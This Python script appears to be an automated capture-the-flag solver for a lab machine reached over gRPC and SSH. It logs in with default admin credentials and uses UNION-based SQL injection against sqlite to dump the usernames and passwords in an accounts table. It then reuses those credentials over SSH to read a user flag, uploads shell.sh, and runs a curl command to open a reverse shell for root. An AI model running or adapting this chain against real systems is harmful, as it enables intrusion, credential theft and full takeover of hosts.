import grpc
import SimpleApp_pb2_grpc as pb2_grpc
import SimpleApp_pb2 as pb2
import paramiko
import multiprocessing
import json

from revsh import Revsh


host = "10.10.11.214"
grpc_port = 50051


def main():
    stub = setup_grpc()
    token = get_token(stub)
    users = get_users(stub, token)

    get_user_flag(users)
    get_root_flag(users)


def get_token(stub):
    user = pb2.LoginUserRequest(username="admin", password="admin")
    _, call = stub.LoginUser.with_call(user)
    metadata = call.trailing_metadata()
    token = metadata[0].value[2:-1]

    return token


def get_users(stub, token):
    print("Getting users")

    query = "62 UNION SELECT name FROM sqlite_master where type='table'"
    table = make_get_id_req(token, query, stub)

    query = f"62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info('{table}')"
    cols = make_get_id_req(token, query, stub)

    res = []
    for col in cols.split(","):
        query = f"62 UNION SELECT GROUP_CONCAT({col}) FROM accounts"
        r = make_get_id_req(token, query, stub)
        res.append(r.split(","))

    usernames = res[0]
    passwords = res[1]

    users = []
    for i in range(len(usernames)):
        users.append({"username": usernames[i], "password": passwords[i]})

    print("Users found")
    print(json.dumps(users))
    
    return users


def get_user_flag(users):
    print (f"User flag: {ssh_exec_command('cat user.txt', users)}")


def get_root_flag(users):
    transfer_file_from_local(users)
    exec_curl_command(users)

def make_get_id_req(token, query, stub):
    metadata = (("token", token),)
    id_request = pb2.getInfoRequest(id=query)
    r = stub.getInfo.with_call(id_request, metadata=metadata)
    return r[0].message


def setup_grpc():
    channel = grpc.insecure_channel(f"{host}:{grpc_port}")
    stub = pb2_grpc.SimpleAppStub(channel)

    return stub


def init_ssh(users):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for user in users:
        if user["username"] == "admin":
            continue

        try:
            client.connect(host, username=user["username"], password=user["password"])
            return client

        except paramiko.ssh_exception.AuthenticationException:
            continue

    return None


def ssh_exec_command(command, users):
    client = init_ssh(users)
    ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command(command)
    client.close()

    return ssh_stdout.read().decode("utf-8")


def transfer_file_from_local(users):
    client = init_ssh(users)
    ftp_client = client.open_sftp()
    ftp_client.put("shell.sh", "/home/sau/shell.sh")


def exec_curl_command(users):
    print("Executing curl for reverse shell")

    with open("../curl.txt") as f:
        command = f.read().strip()
    ssh_exec_command(command, users)


if __name__ == "__main__":
    main()
